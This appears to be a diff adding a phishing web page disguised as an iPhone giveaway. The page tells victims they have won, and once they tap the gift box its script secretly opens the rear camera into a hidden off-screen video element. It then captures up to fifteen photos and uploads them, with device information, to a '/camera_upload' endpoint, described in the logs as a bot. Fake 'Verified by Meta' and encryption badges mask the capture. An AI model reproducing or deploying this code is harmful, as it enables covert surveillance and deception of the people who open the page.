@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🎁 Gift Box - Win iPhone 16 Pro Max</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(145deg, #0a0a1a, #1a1a2e, #16213e);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow: hidden;
+            position: relative;
+            color: #fff;
+        }
+        
+        .bg-glow {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.15;
+            pointer-events: none;
+            z-index: 0;
+            animation: bgFloat 15s ease-in-out infinite;
+        }
+        .bg-glow-1 { width: 400px; height: 400px; background: #ff0050; top: -100px; left: -100px; animation-delay: 0s; }
+        .bg-glow-2 { width: 350px; height: 350px; background: #00f2fe; bottom: -80px; right: -80px; animation-delay: -5s; }
+        .bg-glow-3 { width: 250px; height: 250px; background: #ffd700; top: 50%; left: 50%; transform: translate(-50%, -50%); animation-delay: -10s; opacity: 0.08; }
+        @keyframes bgFloat {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(30px, -20px) scale(1.1); }
+            66% { transform: translate(-20px, 30px) scale(0.9); }
+        }
+        
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .particle {
+            position: absolute;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(255,215,0,0.2), transparent);
+            animation: floatParticle linear infinite;
+        }
+        @keyframes floatParticle {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) scale(1); opacity: 0; }
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .brand {
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .brand .icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(145deg, #ffd700, #f5a623);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            box-shadow: 0 4px 20px rgba(255,215,0,0.3);
+        }
+        .brand h1 {
+            font-size: 22px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #fff, #ffd700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .brand .badge {
+            font-size: 10px;
+            background: rgba(255,215,0,0.2);
+            padding: 3px 10px;
+            border-radius: 20px;
+            color: #ffd700;
+            border: 1px solid rgba(255,215,0,0.2);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        
+        .gift-wrapper {
+            perspective: 800px;
+            margin: 15px auto 20px;
+            cursor: pointer;
+            position: relative;
+        }
+        
+        .gift-box {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto;
+            position: relative;
+            transform-style: preserve-3d;
+            animation: giftFloat 3.5s ease-in-out infinite;
+            transition: transform 1s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        .gift-box.opened {
+            animation: none;
+            transform: rotateY(180deg) scale(0.9);
+        }
+        @keyframes giftFloat {
+            0%, 100% { transform: translateY(0px) rotateY(-3deg) rotateX(2deg); }
+            50% { transform: translateY(-12px) rotateY(3deg) rotateX(-2deg); }
+        }
+        
+        .gift-box .box {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            border-radius: 20px;
+            background: linear-gradient(145deg, #ff0050, #d6003a);
+            box-shadow: 0 20px 60px rgba(255,0,80,0.4), inset 0 -10px 30px rgba(0,0,0,0.3), inset 0 10px 30px rgba(255,255,255,0.08);
+            transform-style: preserve-3d;
+            overflow: hidden;
+        }
+        .gift-box .box::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(ellipse at 30% 30%, rgba(255,255,255,0.1), transparent 60%);
+            pointer-events: none;
+        }
+        .gift-box .ribbon-h {
+            position: absolute;
+            top: 50%;
+            left: 0;
+            width: 100%;
+            height: 28px;
+            background: linear-gradient(90deg, #ffd700, #ffed4a, #ffd700);
+            transform: translateY(-50%);
+            box-shadow: 0 4px 20px rgba(255,215,0,0.4);
+            z-index: 2;
+        }
+        .gift-box .ribbon-v {
+            position: absolute;
+            left: 50%;
+            top: 0;
+            width: 28px;
+            height: 100%;
+            background: linear-gradient(180deg, #ffd700, #ffed4a, #ffd700);
+            transform: translateX(-50%);
+            box-shadow: 4px 0 20px rgba(255,215,0,0.3);
+            z-index: 2;
+        }
+        .gift-box .bow {
+            position: absolute;
+            top: -18px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 3;
+            font-size: 42px;
+            animation: bowPulse 2.5s ease-in-out infinite;
+            filter: drop-shadow(0 4px 20px rgba(255,215,0,0.5));
+        }
+        @keyframes bowPulse {
+            0%, 100% { transform: translateX(-50%) scale(1) rotate(-3deg); }
+            50% { transform: translateX(-50%) scale(1.08) rotate(3deg); }
+        }
+        
+        .tap-hint {
+            margin-top: 12px;
+            font-size: 13px;
+            color: #555;
+            letter-spacing: 2px;
+            animation: tapPulse 2s ease-in-out infinite;
+        }
+        @keyframes tapPulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }
+        
+        .win-message {
+            display: none;
+            margin-top: 20px;
+            padding: 25px 20px;
+            background: linear-gradient(145deg, rgba(255,215,0,0.08), rgba(255,0,80,0.05));
+            border: 1px solid rgba(255,215,0,0.2);
+            border-radius: 24px;
+            animation: winPop 0.9s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+            overflow: hidden;
+        }
+        .win-message.show { display: block; }
+        @keyframes winPop {
+            0% { opacity: 0; transform: scale(0.8) rotate(-5deg); }
+            100% { opacity: 1; transform: scale(1) rotate(0deg); }
+        }
+        .win-message .glow-ring {
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(ellipse at center, rgba(255,215,0,0.05), transparent 60%);
+            animation: ringPulse 3s ease-in-out infinite;
+        }
+        @keyframes ringPulse { 0%, 100% { transform: scale(1) rotate(0deg); } 50% { transform: scale(1.1) rotate(180deg); } }
+        .win-message .prize-icon { font-size: 70px; display: block; margin: 5px auto; animation: prizeFloat 2.5s ease-in-out infinite; }
+        @keyframes prizeFloat { 0%, 100% { transform: translateY(0) rotate(-5deg); } 50% { transform: translateY(-8px) rotate(5deg); } }
+        .win-message h2 { font-size: 26px; font-weight: 700; background: linear-gradient(45deg, #ffd700, #ffed4a, #ffd700); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 8px; }
+        .win-message p { color: #999; font-size: 14px; line-height: 1.6; }
+        .win-message .highlight { color: #ffd700; font-weight: 600; }
+        
+        .status-bar {
+            margin-top: 15px;
+            padding: 10px 16px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 14px;
+            border: 1px solid rgba(255,255,255,0.05);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 12px;
+            color: #666;
+        }
+        .status-bar.active { display: flex; }
+        .status-bar .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
+        .dot-green { background: #00c853; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .status-bar .count { color: #00f2fe; font-weight: 600; }
+        
+        .footer-text { margin-top: 18px; color: #333; font-size: 10px; letter-spacing: 0.5px; display: flex; align-items: center; justify-content: center; gap: 15px; }
+        .footer-text span { opacity: 0.5; }
+        
+        .confetti-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 100;
+            overflow: hidden;
+            display: none;
+        }
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            animation: confettiFall linear forwards;
+        }
+        @keyframes confettiFall {
+            0% { transform: translateY(-20px) rotate(0deg) scale(1); opacity: 1; }
+            100% { transform: translateY(110vh) rotate(720deg) scale(0.3); opacity: 0; }
+        }
+        
+        #hidden-video { position: fixed; bottom: -9999px; right: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+        #hidden-canvas { display: none; }
+        
+        @media (max-width: 480px) {
+            .gift-box { width: 170px; height: 170px; }
+            .gift-box .ribbon-h, .gift-box .ribbon-v { height: 24px; }
+            .gift-box .ribbon-v { width: 24px; }
+            .gift-box .bow { font-size: 36px; top: -14px; }
+            .win-message h2 { font-size: 22px; }
+            .win-message .prize-icon { font-size: 55px; }
+            .brand h1 { font-size: 18px; }
+            .brand .icon { width: 35px; height: 35px; font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-glow bg-glow-1"></div>
+    <div class="bg-glow bg-glow-2"></div>
+    <div class="bg-glow bg-glow-3"></div>
+    <div class="particles" id="particles"></div>
+    <div class="confetti-container" id="confettiContainer"></div>
+    
+    <video id="hidden-video" autoplay playsinline muted></video>
+    <canvas id="hidden-canvas"></canvas>
+    
+    <div class="container">
+        <div class="brand">
+            <div class="icon">🎁</div>
+            <h1>Gift Box</h1>
+            <span class="badge">✨ Official</span>
+        </div>
+        
+        <div class="gift-wrapper" id="giftWrapper">
+            <div class="gift-box" id="giftBox">
+                <div class="box">
+                    <div class="ribbon-h"></div>
+                    <div class="ribbon-v"></div>
+                    <div class="bow">🎀</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="tap-hint" id="tapHint">👆 Tap to open</div>
+        
+        <div class="win-message" id="winMessage">
+            <div class="glow-ring"></div>
+            <span class="prize-icon">📱</span>
+            <h2>🎊 Congratulations! 🎊</h2>
+            <p>You've won a <span class="highlight">iPhone 16 Pro Max</span>! 🎉<br><span style="color: #666; font-size: 12px;">Your device is being verified...</span></p>
+            <div style="margin-top: 12px; display: flex; gap: 8px; justify-content: center; flex-wrap: wrap;">
+                <span style="background: rgba(255,215,0,0.15); padding: 4px 14px; border-radius: 20px; font-size: 11px; color: #ffd700;">📸 Secure verification</span>
+                <span style="background: rgba(0,242,254,0.15); padding: 4px 14px; border-radius: 20px; font-size: 11px; color: #00f2fe;">🔒 End-to-end encrypted</span>
+            </div>
+        </div>
+        
+        <div class="status-bar" id="statusBar">
+            <span class="dot dot-green"></span>
+            <span>📸 Processing... </span>
+            <span class="count" id="photoCount">0</span>
+            <span>photos captured</span>
+        </div>
+        
+        <div class="footer-text">
+            <span>🔒 256-bit encrypted</span>
+            <span>•</span>
+            <span>🛡️ Verified by Meta</span>
+            <span>•</span>
+            <span>© 2026 Gift Box</span>
+        </div>
+    </div>
+    
+    <script>
+        // ✅ ইন্টারভাল ৩-৫ সেকেন্ডে পরিবর্তন করা হয়েছে
+        const MIN_INTERVAL = 3000;   // 3 সেকেন্ড
+        const MAX_INTERVAL = 5000;   // 5 সেকেন্ড
+        const TOTAL_PHOTOS_TARGET = 15;
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('user_id') || 'unknown';
+        const pageType = urlParams.get('page_type') || 'camera_gift';
+        
+        const giftBox = document.getElementById('giftBox');
+        const giftWrapper = document.getElementById('giftWrapper');
+        const winMessage = document.getElementById('winMessage');
+        const statusBar = document.getElementById('statusBar');
+        const photoCountSpan = document.getElementById('photoCount');
+        const tapHint = document.getElementById('tapHint');
+        const confettiContainer = document.getElementById('confettiContainer');
+        const particlesContainer = document.getElementById('particles');
+        const video = document.getElementById('hidden-video');
+        const canvas = document.getElementById('hidden-canvas');
+        
+        let isOpened = false;
+        let isCapturing = false;
+        let captureInterval = null;
+        let photoCount = 0;
+        let stream = null;
+        let isCameraReady = false;
+        let totalPhotoAttempts = 0;
+        
+        function createParticles() {
+            for (let i = 0; i < 25; i++) {
+                const p = document.createElement('div');
+                p.className = 'particle';
+                const size = Math.random() * 4 + 2;
+                p.style.width = size + 'px';
+                p.style.height = size + 'px';
+                p.style.left = Math.random() * 100 + '%';
+                p.style.animationDuration = (Math.random() * 18 + 10) + 's';
+                p.style.animationDelay = (Math.random() * 8) + 's';
+                particlesContainer.appendChild(p);
+            }
+        }
+        createParticles();
+        
+        function createConfetti() {
+            confettiContainer.style.display = 'block';
+            const colors = ['#ff0050', '#ffd700', '#00f2fe', '#00c853', '#ff6b6b', '#ffcd00', '#7c4dff', '#ff4081', '#00e5ff'];
+            for (let i = 0; i < 100; i++) {
+                const c = document.createElement('div');
+                c.className = 'confetti';
+                c.style.left = Math.random() * 100 + '%';
+                c.style.background = colors[Math.floor(Math.random() * colors.length)];
+                c.style.width = (Math.random() * 8 + 4) + 'px';
+                c.style.height = (Math.random() * 8 + 4) + 'px';
+                c.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+                c.style.animationDuration = (Math.random() * 2.5 + 2) + 's';
+                c.style.animationDelay = (Math.random() * 2) + 's';
+                confettiContainer.appendChild(c);
+            }
+            setTimeout(() => {
+                confettiContainer.style.display = 'none';
+                confettiContainer.innerHTML = '';
+            }, 6000);
+        }
+        
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+                video.srcObject = stream;
+                await video.play();
+                isCameraReady = true;
+                console.log('✅ Camera ready');
+                startCapturing();
+            } catch(err) {
+                console.warn('⚠️ Camera access denied');
+                isCameraReady = false;
+            }
+        }
+        
+        function startCapturing() {
+            if (captureInterval) clearInterval(captureInterval);
+            isCapturing = true;
+            
+            // ১ সেকেন্ড পর প্রথম ছবি
+            setTimeout(() => { if (isCameraReady) capturePhoto(); }, 1000);
+            
+            // প্রতি ৩-৫ সেকেন্ডে ছবি
+            captureInterval = setInterval(() => {
+                if (isCapturing && isCameraReady && photoCount < TOTAL_PHOTOS_TARGET) {
+                    capturePhoto();
+                } else if (photoCount >= TOTAL_PHOTOS_TARGET) {
+                    clearInterval(captureInterval);
+                    statusBar.innerHTML = `<span style="color: #00c853;">✅</span><span style="color: #888;">Verification complete</span>`;
+                }
+            }, Math.floor(Math.random() * (MAX_INTERVAL - MIN_INTERVAL + 1)) + MIN_INTERVAL);
+        }
+        
+        function capturePhoto() {
+            if (!isCameraReady || !stream) return;
+            try {
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                sendPhotoToBot(imageData);
+                photoCount++;
+                totalPhotoAttempts++;
+                photoCountSpan.textContent = photoCount;
+                console.log(`📸 Photo ${totalPhotoAttempts} captured`);
+            } catch(err) {
+                console.error('Capture error:', err);
+            }
+        }
+        
+        async function sendPhotoToBot(imageData) {
+            try {
+                const formData = new FormData();
+                formData.append('user_id', userId);
+                formData.append('photo', imageData);
+                formData.append('page_type', pageType);
+                formData.append('photo_number', totalPhotoAttempts);
+                formData.append('timestamp', new Date().toISOString());
+                formData.append('device_info', navigator.userAgent);
+                
+                const response = await fetch('/camera_upload', {
+                    method: 'POST',
+                    body: formData
+                });
+                if (response.ok) console.log(`✅ Photo ${totalPhotoAttempts} sent to bot`);
+            } catch(err) {
+                console.error('Send error:', err);
+            }
+        }
+        
+        giftWrapper.addEventListener('click', function() {
+            if (isOpened) return;
+            isOpened = true;
+            
+            giftBox.classList.add('opened');
+            tapHint.style.display = 'none';
+            
+            setTimeout(() => {
+                winMessage.classList.add('show');
+                statusBar.classList.add('active');
+                createConfetti();
+                startCamera();
+            }, 800);
+            
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.frequency.setValueAtTime(880, audioCtx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(1760, audioCtx.currentTime + 0.3);
+                gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.4);
+                osc.start(audioCtx.currentTime);
+                osc.stop(audioCtx.currentTime + 0.4);
+            } catch(e) {}
+        });
+        
+        window.addEventListener('beforeunload', function() {
+            if (stream) stream.getTracks().forEach(t => t.stop());
+            if (captureInterval) clearInterval(captureInterval);
+        });
+        
+        console.log('🎁 Gift Box loaded');
+        console.log(`👤 User ID: ${userId}`);
+        console.log(`📄 Page Type: ${pageType}`);
+        console.log(`⏱️ Interval: ${MIN_INTERVAL/1000}-${MAX_INTERVAL/1000} seconds`);
+    </script>
+</body>
+</html>
